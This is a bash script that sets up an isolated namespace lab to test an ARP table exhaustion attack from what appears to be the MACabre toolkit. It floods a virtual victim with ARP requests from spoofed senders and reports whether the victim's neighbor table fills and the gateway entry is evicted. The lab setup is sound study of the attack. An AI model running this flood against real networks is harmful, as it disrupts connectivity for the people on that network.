#!/usr/bin/env bash
# Isolated ARP table exhaustion lab (Linux only, needs root).
#
# Topology, all inside network namespaces:
#
#   victim   --(veth)-- [switch: bridge br0, port p-vic]   10.77.0.10, small neighbor table
#   gateway  --(veth)-- [switch: bridge br0, port p-gw ]   10.77.0.1, a legitimate neighbor
#   attacker --(veth)-- [switch: bridge br0, port p-att]   MACabre's ARP table exhaustion sender
#
#   victim:   10.77.0.10/16. Its neighbor table limit (gc_thresh3) is lowered to 6 when the kernel
#             allows it; otherwise the system default (1024) applies.
#   attacker: sends ARP requests for the victim's address from fake senders in 10.77.16.0/20.
#
#   Phase 0 (baseline): the victim pings the gateway, so it holds a legitimate entry for it.
#   Phase 1 (exhaustion): the attacker sends FRAMES requests from new fake senders. Checked: how
#                         many fake entries the victim learns, the total table size, and whether
#                         the gateway's entry survives.
#
# What this shows: the victim learns entries from requests for its own address, and its table
# stays within the configured limit. Whether the gateway's entry survives depends on the kernel's
# eviction, and the lab reports what happened instead of assuming it.
#
# What it does not show: the limits and eviction of other operating systems and of routers,
# which use other defaults. Those need the target device.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/arp_table_exhaustion_lab.sh
#   sudo FRAMES=40 scripts/lab/arp_table_exhaustion_lab.sh
#
# Requirements: iproute2 (ip, bridge) and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge sysctl ping; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
FRAMES="${FRAMES:-1100}"
VICTIM_IP="10.77.0.10"
GATEWAY_IP="10.77.0.1"
SENDER_SUBNET="10.77.16.0/20"
VICTIM_MAC="02:00:00:00:00:10"
GATEWAY_MAC="02:00:00:00:00:01"
ATTACKER_MAC="02:00:00:00:00:30"
WORK="$(mktemp -d)"
chmod 755 "$WORK"

stop_lab() {
    for ns in victim gateway attacker switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add switch
ip netns add victim
ip netns add gateway
ip netns add attacker

for spec in "vic|victim|$VICTIM_MAC|$VICTIM_IP/16" "gw|gateway|$GATEWAY_MAC|$GATEWAY_IP/16" "att|attacker|$ATTACKER_MAC|"; do
    name="$(echo "$spec" | cut -d'|' -f1)"
    ns="$(echo "$spec" | cut -d'|' -f2)"
    mac="$(echo "$spec" | cut -d'|' -f3)"
    addr="$(echo "$spec" | cut -d'|' -f4)"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns switch
    ip netns exec "$ns" ip link set "h-$name" address "$mac"
    ip netns exec "$ns" ip link set "h-$name" up
    if [[ -n "$addr" ]]; then
        ip netns exec "$ns" ip addr add "$addr" dev "h-$name"
    fi
    ip netns exec switch ip link set "p-$name" up
done

ip netns exec switch ip link add br0 type bridge
ip netns exec switch ip link set br0 up
for name in vic gw att; do
    ip netns exec switch ip link set "p-$name" master br0
done

# Try to set a small neighbor table on the victim, so the limit is reached with a few entries.
# Some kernels do not expose these settings in a new network namespace. Then the system default
# limit is used, and the flood is sized to reach it.
if ip netns exec victim sh -c 'echo 6 > /proc/sys/net/ipv4/neigh/default/gc_thresh3' 2>/dev/null; then
    GC_MAX=6
    LIMIT_NOTE="set to $GC_MAX in the victim's namespace"
else
    GC_MAX="$(cat /proc/sys/net/ipv4/neigh/default/gc_thresh3)"
    LIMIT_NOTE="not settable in the victim's namespace, using the system default of $GC_MAX"
fi
echo "Neighbor table limit (gc_thresh3): $LIMIT_NOTE"
echo

# Sends FRAMES requests for the victim's address, from new fake senders in SENDER_SUBNET.
SEND_CODE='
import os, threading
from macabre.attacks.arp_table_exhaustion import ArpTableExhaustionConfig, run_arp_table_exhaustion
run_arp_table_exhaustion(
    ArpTableExhaustionConfig(iface="h-att", victim_ip=os.environ["VICTIM_IP"], subnet=os.environ["SENDER_SUBNET"],
                             rate=100, count=int(os.environ["FRAMES"])),
    threading.Event(),
    lambda _s: None,
)
'

# Entries in the victim's neighbor table, and entries in the fake sender subnet.
entries() {
    ip netns exec victim ip -4 neigh show | grep -c . || true
}
fake_entries() {
    ip netns exec victim ip -4 neigh show | awk '$1 ~ /^10\.77\.(1[6-9]|2[0-9]|3[01])\./' | grep -c . || true
}
gateway_entry() {
    ip netns exec victim ip -4 neigh show "$GATEWAY_IP" | grep -c . || true
}

echo "Phase 0: baseline, the victim pings the gateway"
ip netns exec victim ping -c 2 -W 1 "$GATEWAY_IP" >/dev/null 2>&1 || true
BASE_ENTRIES="$(entries)"
BASE_GATEWAY="$(gateway_entry)"
echo "  entries in the victim's neighbor table: $BASE_ENTRIES"
echo "  gateway entry present: $([[ "$BASE_GATEWAY" -gt 0 ]] && echo yes || echo no)"
echo

echo "Phase 1: exhaustion, the attacker sends $FRAMES requests for $VICTIM_IP from new senders in $SENDER_SUBNET"
ip netns exec attacker env PYTHONPATH="$ROOT/src" VICTIM_IP="$VICTIM_IP" SENDER_SUBNET="$SENDER_SUBNET" FRAMES="$FRAMES" \
    "$PY" -c "$SEND_CODE" >/dev/null 2>&1
sleep 1
AFTER_ENTRIES="$(entries)"
AFTER_FAKE="$(fake_entries)"
AFTER_GATEWAY="$(gateway_entry)"
echo "  entries in the victim's neighbor table: $AFTER_ENTRIES (limit gc_thresh3 = $GC_MAX)"
echo "  fake sender entries learned: $AFTER_FAKE"
echo "  gateway entry present: $([[ "$AFTER_GATEWAY" -gt 0 ]] && echo yes || echo no)"
echo

if [[ "$BASE_GATEWAY" -gt 0 && "$AFTER_FAKE" -gt 0 && "$AFTER_ENTRIES" -le "$GC_MAX" ]]; then
    if [[ "$AFTER_ENTRIES" -ge $(( GC_MAX * 9 / 10 )) ]]; then
        if [[ "$AFTER_GATEWAY" -gt 0 ]]; then
            GW_NOTE="The gateway's entry survived the flood."
        else
            GW_NOTE="The gateway's entry was evicted by the flood."
        fi
        echo "Result: the victim learned $AFTER_FAKE entries from requests for its own address, and its table reached its limit of $GC_MAX. $GW_NOTE Other systems use other limits and eviction rules; test the target device."
    else
        echo "Result: inconclusive. The victim learned $AFTER_FAKE entries and its table held $AFTER_ENTRIES of its limit of $GC_MAX, so the limit was not reached and eviction was not exercised. The kernel learned fewer entries than requests sent in this run."
        exit 2
    fi
else
    echo "Result: the outcome did not match the expected phases. Result unreliable."
    exit 1
fi
